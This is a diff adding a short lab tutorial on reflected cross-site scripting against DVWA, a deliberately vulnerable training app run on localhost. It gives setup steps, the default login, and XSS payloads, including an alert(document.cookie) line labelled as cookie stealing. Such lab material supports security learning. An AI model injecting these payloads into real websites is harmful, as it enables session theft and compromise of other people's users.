@@ -1,0 +1,53 @@
+DVWA XSS (Reflected) Attack
+Inject JavaScript alert() into DVWA form field for Cross-Site Scripting.
+
+Prerequisites
+DVWA already running (http://localhost/dvwa):
+
+bash
+sudo service apache2 start
+sudo service mysql start
+Access DVWA
+text
+Firefox → http://localhost/dvwa/setup.php
+→ Click "Create / Reset Database"
+→ Login: admin / password
+→ DVWA Security → low
+XSS (Reflected) Attack
+Normal Input
+text
+Name: asi
+→ Result: Hello asi
+Malicious Payload
+text
+Name: <script>alert('XSS');</script>
+→ Result: Popup alert box "XSS" appears! 💥
+Attack Steps
+Navigate: XSS (Reflected)
+
+Security: Low
+
+Name field: <script>alert('XSS');</script>
+
+Submit → Alert popup executes!
+
+Visual Result
+text
+[Normal]        [XSS Attack]
+Hello asi       [POPUP: XSS]
+                JavaScript executed!
+Quick Commands
+bash
+# Start services
+sudo service apache2 start
+sudo service mysql start
+
+# Access DVWA
+http://localhost/dvwa
+
+# Path: XSS (Reflected) → Low → Inject payload
+Payload Variations
+xml
+<script>alert('XSS')</script>        # Classic popup
+<script>alert(document.cookie)</script> # Steal cookies
+<img src=x onerror=alert('XSS')>     # Image error trigger
